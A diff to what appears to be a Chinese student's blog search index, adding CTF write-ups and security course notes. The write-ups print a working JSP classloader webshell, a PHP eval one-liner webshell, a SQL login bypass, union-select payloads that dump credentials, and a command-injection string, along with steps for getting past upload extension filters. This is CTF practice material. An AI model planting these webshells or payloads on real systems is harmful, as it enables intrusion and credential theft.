@@ -34,6 +34,100 @@
       </tags>
   </entry>
   <entry>
+    <title>难度2</title>
+    <url>/2022/07/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%9A%BE%E5%BA%A62/</url>
+    <content><![CDATA[<p>#upload1</p>
+<p>看题目，是一个文件上传题目，还是最简单那种（逃<br>那就摸出我们的一句话木马来<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/52aee8f1105f2858.png"><br>f12看到文件后缀限制<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/e5c13d8109436b45.png"><br>也就是说需要绕过，post请求还是可以轻松绕过的<br>先把php马改成jpg后缀，bp抓包，然后直接上传<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/473e049611680f6a.png"><br><img src="https://s3.bmp.ovh/imgs/2022/07/14/c01503a67a8105a2.png"><br>把这个改成php，然后发送请求<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/81bc73bf7601079b.png"><br>可以看到，上传成功了<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/2bb74a4ef9f79257.png"><br>访问一下这个路径，可以访问<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/8aec18e389cff6bb.png"><br>摸出咱的蚁剑进行登录<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/9220270af546d6b2.png"><br>然后就可以进入靶机的后台，拿到flag  </p>
+<pre><code>cyberpeace&#123;9df2577798cc26b31c2c208f0730b82d&#125;
+</code></pre>
+<h1 id="xff与referer"><a href="#xff与referer" class="headerlink" title="xff与referer"></a>xff与referer</h1><p>伪造xff和伪造referer<br>添加xff和referer的头文件即可<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/630eb9bbb609e8dd.png"><br><a href="https://www.cnblogs.com/huhu1020387597/p/11479468.html">关于referer</a><br><a href="https://baike.baidu.com/item/X-Forwarded-For/3593639?fr=aladdin">关于xff</a>  </p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>打题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信安世纪7.5的结课赛</title>
+    <url>/2022/07/06/%E4%BF%A1%E5%AE%89%E4%B8%96%E7%BA%AA7-5%E7%9A%84%E7%BB%93%E8%AF%BE%E8%B5%9B/</url>
+    <content><![CDATA[<p>#sign<br>签到题 f12 base64 抬走<br>#key<br>一个万能密码的题，用户名随便输，密码是</p>
+<pre><code>111&#39;or&#39;1&#39;=&#39;1
+</code></pre>
+<p>前面三个1也可以换成其他的<br>#java<br>上传文件漏洞，并且是java脚本类型的</p>
+<pre><code>&lt;%!
+class U extends ClassLoader &#123;
+    U(ClassLoader c) &#123;
+        super(c);
+    &#125;
+    public Class g(byte[] b) &#123;
+        return super.defineClass(b, 0, b.length);
+    &#125;
+&#125;
+
+public byte[] base64Decode(String str) throws Exception &#123;
+    try &#123;
+        Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);
+        return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);
+    &#125; catch (Exception e) &#123;
+        Class clazz = Class.forName(&quot;java.util.Base64&quot;);
+        Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);
+        return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);
+    &#125;
+&#125;
+%&gt;
+&lt;%
+String cls = request.getParameter(&quot;passwd&quot;);
+if (cls != null) &#123;
+    new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+&#125;
+%&gt;
+</code></pre>
+<p>把这样一个.jsp的木马上传上去，打开&#x2F;upload&#x2F;1.jsp&#x2F;的目录，如果能显示空白页，大概率能成<br>用蚁剑或者菜刀之类的webshall连进去，密码是passwd，进去能在根目录找到flag  </p>
+<h1 id="browser"><a href="#browser" class="headerlink" title="browser"></a>browser</h1><p>也是木马题，不过和上面那个不太一样，需要绕过<br>我们用php一句话木马</p>
+<pre><code>&lt;?php @eval($_POST[value]);?&gt;
+</code></pre>
+<p>上传时候，先改成1.jpg，然后用brupsuit抓包，把上传文件包的文件后缀改回.php<br>同样，目录访问一下，空白页，回来用webshell连，密码是value，根目录有flag  </p>
+<h1 id="mapmap"><a href="#mapmap" class="headerlink" title="mapmap"></a>mapmap</h1><p>一道注入题，而且有报错有回显<br>id&#x3D;1’得到报错，所以代码里是’<br>然后</p>
+<pre><code>payload: id=-1&#39; union select 1,2,3,4,5,6 -- +
+</code></pre>
+<p>得到回显数为六，并且显示了2和3<br>然后暴库</p>
+<pre><code>payload: id=-1&#39; union select 1,2,group_concat(username,0x3a,password) from security.users,4,5,6 -- +
+</code></pre>
+<p>之后再爆表爆字段，拿到字段值key1</p>
+<h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>一个rce注入<br>输入</p>
+<pre><code>127.0.0.1;cat$&#123;IFS&#125;../../flag
+</code></pre>
+<p>即可拿到flag</p>
+<p>#我是傻逼<br>因为中间摸了六个小时鱼，就写了这么多（逃</p>
+]]></content>
+      <categories>
+        <category>ctf-wp</category>
+      </categories>
+      <tags>
+        <tag>比赛</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅学计算机网络（1.概述）</title>
+    <url>/2022/06/29/%E6%B5%85%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%881-%E6%A6%82%E8%BF%B0%EF%BC%89/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>信安世纪（信息获取）</title>
+    <url>/2022/06/28/%E4%BF%A1%E5%AE%89%E4%B8%96%E7%BA%AA%EF%BC%88%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%EF%BC%89/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>信安世纪（行业认知及产品技术）</title>
+    <url>/2022/06/28/%E4%BF%A1%E5%AE%89%E4%B8%96%E7%BA%AA%EF%BC%88%E8%A1%8C%E4%B8%9A%E8%AE%A4%E7%9F%A5%E5%8F%8A%E4%BA%A7%E5%93%81%E6%8A%80%E6%9C%AF%EF%BC%89/</url>
+    <content><![CDATA[<p>没有绝对安全的系统<br>网络诞生的初衷是为了通信和共享，并未考虑安全因素<br>网络协议是人指定的，必然存在缺陷<br>软硬件系统是人开发的，必然存在漏洞<br>漏洞肯定存在，人最大的漏洞<br>CMMI 每千行代码的漏洞数量  </p>
+<h1 id="类型一"><a href="#类型一" class="headerlink" title="类型一"></a>类型一</h1><h1 id="类型二"><a href="#类型二" class="headerlink" title="类型二"></a>类型二</h1><p>拒绝服务攻击（ddos）<br>常用来使服务器和网络瘫痪的网络攻击手段<br>流量型<br>漏洞型<br>混合型<br>无法解决只能缓解<br>1.CDN（内容分化网络，解决用户到机房的最后一段距离的，使得相应即使的）<br>可以使得僵尸网络流量分流到各种CDN节点中<br>2.前端部署抗D安全防护设备   </p>
+<p>然后 讲了一堆法律相关我现在用不上的，摆烂！</p>
+]]></content>
+  </entry>
+  <entry>
     <title>团队主页的部署2</title>
     <url>/2022/06/25/%E5%9B%A2%E9%98%9F%E4%B8%BB%E9%A1%B5%E7%9A%84%E9%83%A8%E7%BD%B22/</url>
     <content><![CDATA[<h1 id="上次耻辱过后，一不做二不休，直接重装系统"><a href="#上次耻辱过后，一不做二不休，直接重装系统" class="headerlink" title="上次耻辱过后，一不做二不休，直接重装系统"></a>上次耻辱过后，一不做二不休，直接重装系统</h1><p>学长的oj就无了（）<br>不过以后再说这个<br>这波需要重新配置一下服务器了  </p>
